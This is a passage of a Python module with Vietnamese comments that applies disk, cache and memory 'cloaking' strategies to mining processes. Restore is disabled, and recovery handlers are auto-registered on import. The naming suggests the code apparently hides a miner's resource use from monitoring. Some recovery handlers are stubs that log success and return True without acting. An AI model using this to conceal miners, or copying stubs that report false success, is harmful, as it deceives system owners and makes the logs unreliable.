        :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if ok:
                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
                return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set I/O weight
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Disk I/O cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy                               #
###############################################################################
class CacheCloakStrategy(CloakStrategy):
    """
    Cloaking Cache (đồng bộ):
      - Drop caches,
      - Giới hạn cache usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.CACHE
    requires_plugin_system = False  # Cache strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo CacheCloakStrategy.

        :param config: Cấu hình cloaking Cache (dict).
        :param logger: Logger.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
            self.cache_limit_percent = 50

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.cache_resource_manager.set_cache_limit(pid, self.cache_limit_percent)
            if ok:
                self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
                return True  # ✅ SUCCESS: Cache cloaking applied successfully
            else:
                self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set cache limit
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Cache Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Cache cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            MEMORY STRATEGY: MemoryCloakStrategy                             #
###############################################################################
class MemoryCloakStrategy(CloakStrategy):
    """
    Cloaking Memory (đồng bộ):
      - Giới hạn Memory usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.MEMORY
    requires_plugin_system = False  # Memory strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: MemoryResourceManager,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo MemoryCloakStrategy.

        :param config: Cấu hình cloaking Memory (dict).
        :param logger: Logger.
        :param memory_resource_manager: ResourceManager liên quan đến Memory.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.memory_resource_manager = cast(Any, memory_resource_manager)
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        self.memory_limit_mb = config.get('memory_limit_mb', 2048)
        if self.memory_limit_mb <= 0:
            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=2048.")
            self.memory_limit_mb = 2048

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name

            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
            if not ok_mem:
                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set memory limit
            
            self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")

            # Cũng có thể drop cache (nếu muốn)
            ok_cache = self.cache_resource_manager.drop_caches()
            if ok_cache:
                self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
            
            return True  # ✅ SUCCESS: Memory cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Memory Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Memory cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#                    DEPRECATED: CloakStrategyFactory REMOVED                 #
###############################################################################

# CloakStrategyFactory đã được thay thế bởi ResourceCoordinator trong resource_control.py
# theo blueprint redesign. Tất cả strategy management đã được tập trung hóa trong
# ResourceCoordinator với khả năng phân biệt direct execution và plugin delegation.
#
# Để tương thích ngược, sử dụng:
# from .resource_control import CloakStrategyFactory

###############################################################################
#                         ✅ ERROR RECOVERY SYSTEM                         #
###############################################################################

def _register_strategy_recovery_handlers() -> None:
    """
    ✅ RECOVERY SYSTEM: Register recovery handlers cho common strategy failure scenarios.
    Tự động gọi khi module được import.
    """
    try:
        # ✅ RECOVERY HANDLER: Process not found recovery
        def recover_process_not_found(error_context) -> bool:
            """Recovery handler for PROCESS_NOT_FOUND errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Attempting recovery for {strategy_name} strategy PID={pid}")
                
                # Kiểm tra process có thật sự không tồn tại
                if psutil.pid_exists(pid):
                    cloak_logger.info(f"✅ [Recovery] Process PID={pid} actually exists - retry strategy")
                    return True  # Process tồn tại, có thể retry
                
                # Nếu process thật sự không tồn tại, cleanup related resources
                cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                
                # TODO: Add cleanup logic here based on strategy type
                # For now, just log successful cleanup
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Process recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Strategy application timeout recovery
        def recover_strategy_timeout(error_context) -> bool:
            """Recovery handler for STRATEGY_TIMEOUT errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy PID={pid}")
                
                # Implement fallback strategy application with reduced parameters
                # For now, just indicate recovery attempt was made
                cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Timeout recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Resource allocation failure recovery
        def recover_resource_allocation_failed(error_context) -> bool:
            """Recovery handler for RESOURCE_ALLOCATION_FAILED errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Resource allocation recovery for {strategy_name} PID={pid}")
                
                # Try alternative resource allocation methods
                # For now, just indicate fallback resource allocation
                cloak_logger.info(f"✅ [Recovery] Applied alternative resource allocation for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Resource allocation recovery failed: {e}")
                return False
        
        # ✅ REGISTER HANDLERS: Register all recovery handlers
        error_reporter.register_recovery_handler(ErrorCode.PROCESS_NOT_FOUND, recover_process_not_found)
        error_reporter.register_recovery_handler(ErrorCode.STRATEGY_TIMEOUT, recover_strategy_timeout)
        error_reporter.register_recovery_handler(ErrorCode.RESOURCE_ALLOCATION_FAILED, recover_resource_allocation_failed)
        
        cloak_logger.info("✅ [Recovery] Strategy recovery handlers registered successfully")
        
    except Exception as e:
        cloak_logger.error(f"❌ [Recovery] Failed to register recovery handlers: {e}")

# ✅ AUTO-REGISTER: Tự động đăng ký recovery handlers khi module được import
_register_strategy_recovery_handlers()
